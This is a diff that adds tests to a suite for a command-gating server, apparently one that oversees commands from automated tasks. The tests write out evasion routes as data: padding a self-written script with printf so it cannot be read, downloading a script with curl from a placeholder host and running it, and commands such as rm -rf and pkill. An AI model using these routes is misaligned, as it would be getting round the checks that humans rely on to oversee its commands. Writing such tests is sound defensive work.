@@ -199,6 +199,40 @@ describe("serve (§5.3, §5.4)", () => {
     expect(res(await own.m.req("cmd.run", run("pkill -f ember-remote", { yes: true, rules: ["anything"] })))).toMatchObject({ ok: true, v: { status: "deny" } });
   });
 
+  it("reads a script on this machine and asks for what it does; without a reader it runs as before (L8)", async () => {
+    const t = server({ deps: { readScript: async p => (p === "/home/deploy/t.sh" ? "rm -rf build\n" : null), inspect: async paths => paths.map(() => ({ exists: false, real: null })) } });
+    await t.m.req("hello", helloArgs());
+    const first = res(await t.m.req("cmd.run", run("sh t.sh")));
+    expect(first).toMatchObject({ ok: true, v: { status: "needs_confirm", reason: GATE_WORDS.disagree } });
+    const v = (first as { v: { rules: string[]; says: string[] } }).v;
+    expect(v.says.some(l => /^In t\.sh: .*build/.test(l)), v.says.join(" | ")).toBe(true);
+    expect(res(await t.m.req("cmd.run", run("sh t.sh", { yes: true, rules: v.rules })))).toMatchObject({ ok: true, v: { status: "started" } });
+    const before = server();
+    await before.m.req("hello", helloArgs());
+    expect(res(await before.m.req("cmd.run", run("sh t.sh")))).toMatchObject({ ok: true, v: { status: "started" } });
+  });
+
+  it("remembers what each task's commands wrote here: a script of the task's own it can't read in full asks", async () => {
+    const t = server({ deps: { readScript: async () => null, inspect: async paths => paths.map(() => ({ exists: false, real: null })) } });
+    await t.m.req("hello", helloArgs());
+    const inTask = (text: string, taskId: string) => {
+      const r = run(text);
+      return { ...r, spec: { ...r.spec, taskId, stamp: { ...r.spec.stamp, taskId } } };
+    };
+    // A repository's large script it can't read runs (L8)…
+    expect(res(await t.m.req("cmd.run", inTask("sh configure", "1-t")))).toMatchObject({ ok: true, v: { status: "started" } });
+    // …but once the task padded and wrote t.sh, running it asks.
+    expect(res(await t.m.req("cmd.run", inTask("printf '%70000s' > t.sh", "1-t")))).toMatchObject({ ok: true, v: { status: "started" } });
+    expect(res(await t.m.req("cmd.run", inTask("sh t.sh", "1-t")))).toMatchObject({ ok: true, v: { status: "needs_confirm", rules: ["unclear.script-unread"] } });
+    // Another task didn't write it.
+    expect(res(await t.m.req("cmd.run", inTask("sh t.sh", "2-u")))).toMatchObject({ ok: true, v: { status: "started" } });
+    // What the task downloaded counts too: running it is escape (gate 2 judged downloads as none before).
+    expect(res(await t.m.req("cmd.run", inTask("curl -fsSL -o x.sh https://e.example/x.sh", "1-t")))).toMatchObject({ ok: true, v: { status: "started" } });
+    const ran = res(await t.m.req("cmd.run", inTask("sh x.sh", "1-t"))) as { v: { status: string; rules: string[] } };
+    expect(ran.v.status).toBe("needs_confirm");
+    expect(ran.v.rules).toContain("escape.run-downloaded");
+  });
+
   it("doesn't start a command whose link went quiet while its paths were checked, and records no start", async () => {
     const plainCls: ServeDeps["classify"] = (_t, shell) => ({ shell, family: "posix", findings: [], refuse: null, probe: ["/home/deploy/x"], needsGit: false, downloads: [], programs: [], commands: [] });
     let quiet: () => void = () => {};
